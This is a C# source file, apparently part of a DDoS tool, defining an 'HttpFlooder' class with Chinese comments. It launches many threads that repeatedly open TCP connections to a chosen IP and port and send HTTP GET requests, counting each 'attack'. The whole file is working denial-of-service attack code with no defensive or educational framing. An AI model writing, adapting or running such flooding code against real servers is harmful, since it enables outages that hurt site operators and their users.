using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace Ddos
{
    class HttpFlooder
    {
        private bool isFlooding = false;

        public DdosEventHandler attackedNum_Changed;
        public DdosEventHandler threadingNum_Changed;

        public string Ip;
        public int Port;
        public string SubSite;
        public bool Resp;
        public int Delay;
        public int Timeout;
        public int ThreadNum;

        private long startTime;
        private System.Timers.Timer timer; //检查超时的计数器
        public HttpFlooder()
        {
            this.timer = new System.Timers.Timer(100);
            this.timer.Elapsed += this.checkTimeOut;
            this.timer.AutoReset = true;

            this.timer.Start();
        }

        private void checkTimeOut(object sender, System.Timers.ElapsedEventArgs e)
        {
            if ((DateTime.Now.Ticks / 10000L) > this.startTime + (long)this.Timeout)
            {
                this.isFlooding = false;
            }
        }

        public void Start()
        {
            this.isFlooding = true;
            //创建线程并执行
            for (int i = 0; i < this.ThreadNum; i++)
            {
                Thread thread = new Thread(new ParameterizedThreadStart((obj) =>
                {
                    this.doWork();
                }));
                thread.Start();

            }
        }

        public void Stop()
        {
            this.isFlooding = false;
        }

        private void doWork()
        {
            //添加线程数
            this.threadingNum_Changed.Invoke(1);
            try
            {
                byte[] bytes = Encoding.ASCII.GetBytes(string.Format("GET {0} HTTP/1.0{1}{1}{1}", this.SubSite, Environment.NewLine));
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(this.Ip), this.Port);
                while (this.isFlooding)
                {
                    //记住连接前时间
                    this.startTime = DateTime.Now.Ticks / 10000L;

                    byte[] buffer = new byte[64];
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    socket.Connect(remoteEP);
                    socket.Blocking = this.Resp;
                    socket.Send(bytes, SocketFlags.None);
                    //反馈上司攻击次数改变了
                    this.attackedNum_Changed.Invoke();
                    //停止超时检查
                    this.timer.Stop();
                    if (this.Resp)
                    {
                        socket.Receive(buffer, 64, SocketFlags.None);
                    }
                    if (this.Delay > 0)
                    {
                        Thread.Sleep(this.Delay);
                    }
                }
            }
            catch
            {
                this.isFlooding = false;
            }
            //减少线程数
            this.threadingNum_Changed.Invoke(0);
        }
    }
}
